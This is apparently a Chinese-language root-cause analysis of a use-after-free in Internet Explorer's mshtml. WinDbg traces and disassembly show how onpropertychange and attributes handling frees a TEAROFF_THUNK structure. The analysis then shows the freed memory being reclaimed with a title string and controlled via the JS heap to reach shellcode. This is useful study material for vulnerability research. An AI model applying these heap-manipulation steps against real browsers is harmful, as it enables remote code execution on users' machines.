
```
0:012> bp mshtml!plaingetdispid "du poi(esp+8);as /mu method poi(esp+8);.block{j($scmp(\"${method}\",\"onpropertychange\")=0) '';'gc'}"
0:012> bl
0 e 6a7cc9d1     0001 (0001)  0:**** mshtml!PlainGetDispID "du poi(esp+8);as /mu method poi(esp+8);.block{j($scmp(\"${method}\",\"onpropertychange\")=0) '';'gc'}"
2 d 6a77bb85     0001 (0001)  0:**** mshtml!PlainInvokeEx
```
然后 `F5` 运行

`0175b65c`  `"createElement"`

`0175b65c`  `"createElement"`

`0175b690`  `"body"`

`0175b6a4`  `"appendChild"`

`0175b690`  `"body"`

`0175b6a4`  `"appendChild"`

`0175b6f0`  `"attributes"`

`0175b6c4`  `"onpropertychange"`

`eax=6a7cc9d1 ebx=10000003 ecx=020ca2a0 edx=0175b6c4 esi=001aba30 edi=0066c6c0`

`eip=6a7cc9d1 esp=020ca238 ebp=020ca264 iopl=0         nv up ei pl zr na pe nc`

`cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246`

`mshtml!PlainGetDispID:`

`6a7cc9d1 8bff            mov     edi,edi`

然后打开第二个断点

```
0:005> be 2
0:005> g
Breakpoint 2 hit
eax=8001179f ebx=0066c6c0 ecx=6a77bb85 edx=0000000c esi=020ca16c edi=00000000
eip=6a77bb85 esp=020ca140 ebp=020ca178 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
mshtml!PlainInvokeEx:
6a77bb85 8bff            mov     edi,edi
0:005> pc
eax=6a6d0a90 ebx=00001200 ecx=6a7599dc edx=0066c750 esi=0066c6c0 edi=00000001
eip=6a77bc0b esp=020ca0f0 ebp=020ca13c iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
mshtml!PlainInvokeEx+0xcc:
6a77bc0b ff5038          call    dword ptr [eax+38h]  ds:0023:6a6d0ac8={mshtml!CElement::VersionedInvokeEx (6a7da6d8)}
0:005> t
eax=6a6d0a90 ebx=00001200 ecx=6a7599dc edx=0066c750 esi=0066c6c0 edi=00000001
eip=6a7da6d8 esp=020ca0ec ebp=020ca13c iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
mshtml!CElement::VersionedInvokeEx:
6a7da6d8 8bff            mov     edi,edi
0:005> dd esp
020ca0ec  6a77bc0e 0066c750 8001179f 00000001
020ca0fc  0000000c 020ca240 00000000 020ca250
020ca10c  0175f858 0066c6c0 00000001 efa18903
020ca11c  6a922a90 00000000 020ca16c 0066c6c0
020ca12c  017ccab0 00000001 efa18903 00000000
020ca13c  020ca178 66cfa26e 0066c6c0 8001179f
020ca14c  00000001 0000000c 020ca240 00000000
020ca15c  020ca250 0175f858 8001179f 001aba30
0:005> dds 0066c750
0066c750  6a6d0a90 mshtml!CDivElement::`vftable'
0066c754  00000004
0066c758  00000008
0066c75c  00663ff8       //指向 div 对象的属性数组
0066c760  001aefa0
0066c764  005e2af8
0066c768  0000001f
0066c76c  00010200
0:005> dd 00663ff8
00663ff8  6a5aa594 00000004 00000004 005fba58
00664008  00000000 00000000 2d11148b 80000068
00664018  554d00c6 00000000 00000000 00000000
00664028  00000000 00000000 2d11148f 8000006c
00664038  007700ca 00740061 00680063 002d0020
00664048  00380020 00200029 2d111483 80000066
00664058  006800ce 006c0065 006f006c 0065006b
00664068  00280079 00650074 2d111487 8000006b
005fba58 指向属性数组，每个属性 16 个字节大小
0:005> dd 005fba58
005fba58  00001a03 8001145a 00000000 005f4178
此处 `8001145a` 为 `attributes` 的 dispid，`005f4178` 为指向 `attributes` 属性的接口指针
005fba68  000000d9 00000018 00000184 00000020
005fba78  00000269 00000020 00000000 00000266
005fba88  000002f6 00000556 00000000 00000556
005fba98  2d2b0aaa 8c000033 75a49854 6c90338c
005fbaa8  00000001 005fcee4 005fcbb0 6c9050a0
0:005> bd 2
//返回到 jscript 模块
0:005> g 0x`66cfa26e
eax=00000000 ebx=0066c6c0 ecx=0175f858 edx=00000000 esi=020ca16c edi=00000000
eip=66cfa26e esp=020ca164 ebp=020ca178 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
jscript!IDispatchExInvokeEx2+0x104:
66cfa26e 8d75f4          lea     esi,[ebp-0Ch]
//查看 div 属性数组的内容
0:005> dd 005fba58
005fba58  00001a03 8001145a 00000000 005f4178
005fba68  00200903 8001179f 00000000 0066c830
005fba78  00000d08 800117c4 00000000 00661180
005fba88  000002f6 00000556 00000000 00000556
005fba98  2d2b0aaa 8c000033 75a49854 6c90338c
第二行 `8001179f` 为 `onpropertychange` 的 dispid，`0066c830` 为接口指针，实际上是指向 `TEAROFF_THUNK` 结构的指针，此时引用计数为 3
0:005> dd 0066c830 l10
0066c830  6aadbdc8 00000003 6a775d74 005f4178
0066c840  6a5e77d0 00000000 00000000 00000000
0066c850  03000013 00000000 2d117bc2 88000000
0066c860  6aadcaf0 00000000 6a757be0 0066c750
下面的循环目的是触发垃圾回收，可以对 `66c834` 地址下硬件写入断点，追踪该内存。
0:005> ba w4 0066c834
0:005> g
0175b6f0  "attributes"
0175b6c4  "onpropertychange"
eax=6a7cc9d1 ebx=10000003 ecx=020ca2a0 edx=0175b6c4 esi=001aba30 edi=0066c720
eip=6a7cc9d1 esp=020ca238 ebp=020ca264 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
mshtml!PlainGetDispID:
6a7cc9d1 8bff            mov     edi,edi
0:005> g
Breakpoint 1 hit
eax=0066c830 ebx=001aef10 ecx=6aadbdc8 edx=6a7578d5 esi=0066c830 edi=01751e60
eip=6a7578e1 esp=020ca144 ebp=020ca148 iopl=0         nv up ei pl nz na po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203
mshtml!PlainRelease+0xc:
6a7578e1 8b4604          mov     eax,dword ptr [esi+4] ds:0023:0066c834=00000002
0:005> kb
ChildEBP RetAddr  Args to Child
020ca148 66cfa735 0066c830 01751e60 00000001 mshtml!PlainRelease+0xc
020ca158 66d1444c 001ab9a0 001a2e50 01755008 jscript!VAR::Clear+0x5f
020ca180 66d16e46 00000000 00000000 005d1be0 jscript!GcAlloc::ReclaimGarbage+0x94
020ca19c 66d143e9 00000002 020ca210 00000000 jscript!GcContext::Reclaim+0xb6
020ca1b0 66d142e9 020ca210 0176d350 001abd28 jscript!GcContext::CollectCore+0x123
020ca1c4 66d783f0 020ca220 66d0599a 001aba30 jscript!GcContext::Collect+0x3a
020ca1cc 66d0599a 001aba30 020ca270 020ca210 jscript!JsCollectGarbage+0x1d
020ca234 66d0758c 00000000 00000000 0175f090 jscript!NatFncObj::Call+0x106
020ca2b8 66d04f84 001abd28 001aba30 00000001 jscript!NameTbl::InvokeInternal+0x141
中断两次后引用计数变为 1
0:005> dd 0066c830 l10
0066c830  6aadbdc8 00000001 6a775d74 005f4178
0066c840  6a5e77d0 00000000 00000000 00000000
0066c850  03000013 00000000 2d117bc2 88000000
0066c860  6aadbdc8 00000001 6a775d74 00628600
当指向 `onpropertychange=null;` 时引用计数变为 0，因此要释放接口指针，而该接口指针又指向 `attributes` 接口的指针，因此也要释放 `attributes` 接口的指针，返回后会先释放到 `TEAROFF_THUNK` 缓存中，如果大于两个，则会实际释放内存。
```
`mshtml!PlainRelease:`
```
6a7578d5 8bff            mov     edi,edi
6a7578d7 55              push    ebp
6a7578d8 8bec            mov     ebp,esp
6a7578da 56              push    esi
6a7578db 8b7508          mov     esi,dword ptr [ebp+8]
6a7578de ff4e04          dec     dword ptr [esi+4]
6a7578e1 8b4604          mov     eax,dword ptr [esi+4] ds:0023:0066c834=00000000
6a7578e4 749a            je      mshtml!PlainRelease+0x11 (6a757880)
6a7578e6 5e              pop     esi
6a7578e7 5d              pop     ebp
6a7578e8 c20400          ret     4
6a757883 85c0            test    eax,eax
6a757885 740d            je      mshtml!PlainRelease+0x25 (6a757894)
6a757887 f6461c04        test    byte ptr [esi+1Ch],4
6a75788b 7507            jne     mshtml!PlainRelease+0x25 (6a757894)
6a75788d 8b4e10          mov     ecx,dword ptr [esi+10h]
6a757890 50              push    eax
6a757891 ff5108          call    dword ptr [ecx+8]
6a757894 8b4614          mov     eax,dword ptr [esi+14h]
6a757897 85c0            test    eax,eax
6a757899 0f853d870000    jne     mshtml!PlainRelease+0x2c (6a75ffdc)
6a75789f 56              push    esi
6a7578a0 8b3560125a6a    mov     esi,dword ptr [mshtml!_imp__InterlockedExchange (6a5a1260)]
6a7578a6 683cb0ad6a      push    offset mshtml!g_pTimerMan+0x8 (6aadb03c)
6a7578ab ffd6            call    esi
6a7578ad 85c0            test    eax,eax
6a7578af 741b            je      mshtml!PlainRelease+0x60 (6a7578cc)
6a7578b1 50              push    eax
6a7578b2 6840b0ad6a      push    offset mshtml!g_pTimerMan+0xc (6aadb040)
6a7578b7 ffd6            call    esi
6a7578b9 85c0            test    eax,eax
6a7578bb 740f            je      mshtml!PlainRelease+0x60 (6a7578cc)
6a7578bd 50              push    eax
6a7578be 6a00            push    0
6a7578c0 ff351884ad6a    push    dword ptr [mshtml!g_hProcessHeap (6aad8418)]
6a7578c6 ff15fc125a6a    call    dword ptr [mshtml!_imp__HeapFree (6a5a12fc)]
6a7578cc 33c0            xor     eax,eax
6a7578ce eb16            jmp     mshtml!PlainRelease+0x62 (6a7578e6)
```
`attributes` 属性对象的析构函数会先到属性数组中删除 `attributes` 属性，由于 `attributes` 属性在 `onpropertychange` 属性前面，会导致 `onpropertychange` 属性在属性数组中的索引前移。
```
mshtml!CAttrCollectionator::~CAttrCollectionator:
6a5e8b19 8bff            mov     edi,edi
6a5e8b1b 56              push    esi
6a5e8b1c 6a03            push    3
6a5e8b1e 8bf1            mov     esi,ecx
6a5e8b20 685a140180      push    8001145Ah
6a5e8b25 ff7614          push    dword ptr [esi+14h]
6a5e8b28 c706c83c756a    mov     dword ptr [esi],offset mshtml!CAttrCollectionator::`vftable' (6a753cc8)
6a5e8b2e e80db61500      call    mshtml!CBase::DidFindAAIndexAndDelete (6a744140)
6a5e8b33 8b4614          mov     eax,dword ptr [esi+14h]
6a5e8b36 8b08            mov     ecx,dword ptr [eax]
6a5e8b38 50              push    eax
6a5e8b39 ff91e0000000    call    dword ptr [ecx+0E0h]
6a5e8b3f 8d461c          lea     eax,[esi+1Ch]
6a5e8b42 e8dfef1600      call    mshtml!CImplAry::~CImplAry (6a757b26)
6a5e8b47 8bce            mov     ecx,esi
6a5e8b49 5e              pop     esi
6a5e8b4a e9f18f1700      jmp     mshtml!CBase::~CBase (6a761b40)
```
返回后 `onpropertychange` 属性指向的 `TEAROFF_THUNK` 结构释放到缓存中，属性数组中

`attributes` 属性被删除。
```
0:005> dd 6aadb03c l2
6aadb03c  0066c830 0066c780
0:005> dd 005fba58
005fba58  00200903 8001179f 00000000 0066c830
005fba68  00000d08 800117c4 00000000 00661180
```
当返回后准备从属性数组中删除 `onpropertychange` 属性时由于索引前移，导致无法删除。
```
mshtml!CImplAry::Delete:
6a757ad5 8bff            mov     edi,edi
6a757ad7 56              push    esi
6a757ad8 8bf0            mov     esi,eax
6a757ada 85ff            test    edi,edi
6a757adc 7c28            jl      mshtml!CImplAry::Delete+0x51 (6a757b06)
6a757ade 8b4a04          mov     ecx,dword ptr [edx+4]
6a757ae1 8bc1            mov     eax,ecx
6a757ae3 c1e802          shr     eax,2
6a757ae6 3bf8            cmp     edi,eax
6a757ae8 7d1c            jge     mshtml!CImplAry::Delete+0x51 (6a757b06)
6a757aea 83e103          and     ecx,3
6a757aed 8d0485fcffffff  lea     eax,[eax*4-4]
6a757af4 0bc1            or      eax,ecx
6a757af6 8bc8            mov     ecx,eax
6a757af8 c1e902          shr     ecx,2
6a757afb 894204          mov     dword ptr [edx+4],eax
6a757afe 3bf9            cmp     edi,ecx
6a757b00 0f8268770600    jb      mshtml!CImplAry::Delete+0x2d (6a7bf26e) [br=0]
6a757b06 5e              pop     esi
6a757b07 c3              ret
```
当执行到缓存的两个结构体指针都指向原来 `onpropertychange` 指向的结构时，如果再释放一个 `TEAROFF_THUNK` 结构体，则会导致 `onpropertychange` 指向的结构内存释放，但同时又保留在结构体缓存中，下面为 div 的 `title` 属性赋值时由于字符串的长度与结构体的大小相同，因此会正好占位刚释放的内存。
```
0:005> dd 6aadb03c l2
6aadb03c  0066c830 0066c830
0:005> p
eax=0066c830 ebx=001aba30 ecx=6aadb040 edx=0066c830 esi=76a9bf0a edi=00000001
eip=6a7578bd esp=020ca1c0 ebp=020ca1c4 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
mshtml!PlainRelease+0x51:
6a7578bd 50              push    eax
0:005> p
eax=0066c830 ebx=001aba30 ecx=6aadb040 edx=0066c830 esi=76a9bf0a edi=00000001
eip=6a7578be esp=020ca1bc ebp=020ca1c4 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
mshtml!PlainRelease+0x52:
6a7578be 6a00            push    0
0:005> p
eax=0066c830 ebx=001aba30 ecx=6aadb040 edx=0066c830 esi=76a9bf0a edi=00000001
eip=6a7578c0 esp=020ca1b8 ebp=020ca1c4 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
mshtml!PlainRelease+0x54:
6a7578c0 ff351884ad6a    push    dword ptr [mshtml!g_hProcessHeap (6aad8418)] ds:0023:6aad8418=005a0000
0:005> p
eax=0066c830 ebx=001aba30 ecx=6aadb040 edx=0066c830 esi=76a9bf0a edi=00000001
eip=6a7578c6 esp=020ca1b4 ebp=020ca1c4 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
mshtml!PlainRelease+0x5a:
6a7578c6 ff15fc125a6a    call    dword ptr [mshtml!_imp__HeapFree (6a5a12fc)] ds:0023:6a5a12fc={kernel32!HeapFree (76a9bbd0)}
0:005> dd 6aadb03c l2
6aadb03c  0062ae30 0066c830
```
如下释放的内存正好被 `vtable1` 的字符串占位。
```
0175b738  "title"
Breakpoint 3 hit
eax=0062ae30 ebx=00000000 ecx=6aadb03c edx=00000000 esi=6a768eb0 edi=76a9bf0a
eip=76a9bb46 esp=020c9edc ebp=020c9ef4 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
kernel32!InterlockedExchange+0xe:
76a9bb46 75fa            jne     kernel32!InterlockedExchange+0xa (76a9bb42) [br=0]
0:005> g
Breakpoint 1 hit
eax=00647364 ebx=0064733c ecx=00000008 edx=00000000 esi=00647344 edi=0066c838
eip=77409b60 esp=020c9e24 ebp=020c9e2c iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
msvcrt!memcpy+0x5a:
77409b60 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
0:005> du esi
00647344  "111110000000000"
```
当执行 `style.color="red";` 语句时再次从 `TEAROFF_THUNK` 缓存中分配被字符串占位的结构体。
```
0175b738  "title"
0175b738  "title"
0175b738  "title"
0175b770  "style"
Breakpoint 1 hit
eax=00000000 ebx=00000000 ecx=6aadb040 edx=00000000 esi=0066c830 edi=76a9bf0a
eip=6a75a52d esp=020c8a88 ebp=020c8a94 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
mshtml!CreateTearOffThunk+0x69:
6a75a52d 8b4d08          mov     ecx,dword ptr [ebp+8] ss:0023:020c8a9c=005f4178
0:005> dd esi
0066c830  00310031 00000000 00310031 00310031
0066c840  00300031 00300030 00300030 00300030
0066c850  00300030 00000030 2d117bc2 88000000
0066c860  6aadbdc8 00000001 6a775d74 00628600
0066c870  6a5e77d0 00000000 00000000 00000000
0066c880  03000047 00000000 2d117bd8 8c000000
0066c890  71d8436c 71d3a4dc 71d8c020 00010001
0066c8a0  00000000 71d4b540 00664058 00000000
0:005> g
Breakpoint 1 hit
eax=0066c830 ebx=00000000 ecx=005f4178 edx=0066c830 esi=6a758264 edi=6a758264
eip=6a75a5e4 esp=020c8ab4 ebp=020c8ab4 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
mshtml!CDynamicCF::AddRef+0xb:
6a75a5e4 8b4004          mov     eax,dword ptr [eax+4] ds:0023:0066c834=00000001
0066c830 被覆盖为指向 mshtml 中虚表的指针。
0:005> dd 0066c830
0066c830  6aadbdc8 00000001 6a775d74 005f4178
0066c840  6a7597d0 00000000 00000000 00000000
0066c850  03000030 00000000 2d117bc2 88000000
0066c860  6aadbdc8 00000001 6a775d74 00628600
0066c870  6a5e77d0 00000000 00000000 00000000
0066c880  03000047 00000000 2d117bd8 8c000000
0066c890  71d8436c 71d3a4dc 71d8c020 00010001
0066c8a0  00000000 71d4b540 00664058 00000000
0:005> dds poi(0066c830) l5
6aadbdc8  6a78a5c1 mshtml!PlainDispatchQueryInterface
6aadbdcc  6a75a5d9 mshtml!CPeerEnumerator::AddRef
6aadbdd0  6a7578d5 mshtml!PlainRelease
6aadbdd4  6a76863f mshtml!TearoffThunk3
6aadbdd8  6a7905e0 mshtml!TearoffThunk4
```
当获取 `index` 属性时结果的 `VARIANT` 结构体的值指向 `JS` 堆上我们可以控制的临时对象。
```
00aab9a4  "index"
eax=6a7cc9d1 ebx=10000001 ecx=0205a310 edx=00aab9a4 esi=005eba30 edi=003f9758
eip=6a7cc9d1 esp=0205a2a8 ebp=0205a2d4 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
mshtml!PlainGetDispID:
6a7cc9d1 8bff            mov     edi,edi
0:005> be 2
0:005> g
Breakpoint 2 hit
eax=000003ed ebx=003f9758 ecx=6a77bb85 edx=00000002 esi=0205a1dc edi=00000000
eip=6a77bb85 esp=0205a1b0 ebp=0205a1e8 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
mshtml!PlainInvokeEx:
6a77bb85 8bff            mov     edi,edi
0:005> dd esp
0205a1b0  66cfa26e 003f9758 000003ed 00000001
0205a1c0  00000002 0205a2b0 00aaf068 0205a2c0
0205a1d0  00aaf860 000003ed 005eba30 005eaf38
0205a1e0  00000000 005eb788 0205a224 66cfa1b9
0205a1f0  005eba30 000003ed 00000409 00000002
0205a200  0205a2b0 00aaf068 0205a2c0 00aaf860
0205a210  003f9758 005eba30 00aaf860 003f9758
0205a220  6a75b7e2 0205a2e4 66cfa43a 005eba30
0:005> dd 00aaf068
00aaf068  00000000 00400c48 00aa6fe8 fff80000
00aaf078  00000080 00400c48 00aa6fd8 fff80000
00aaf088  00000000 00000000 00000000 00aaf2a8
```
JS 中函数调用中生成的临时对象会保留在堆上，我们可以通过 JS 代码控制 JS 堆。如下：
```
valuettgot13 = funhellokey(tempkktvalue + 0x0051e7db);
```
此处 `tempkktvalue + 0x0051e7db` 的临时值就会放在堆上。

因此通过该漏洞我们可以定位我们的 `shellcode`，最后一个 `onpropertychange` 属性获取则会触发 `shellcode` 调用。
```
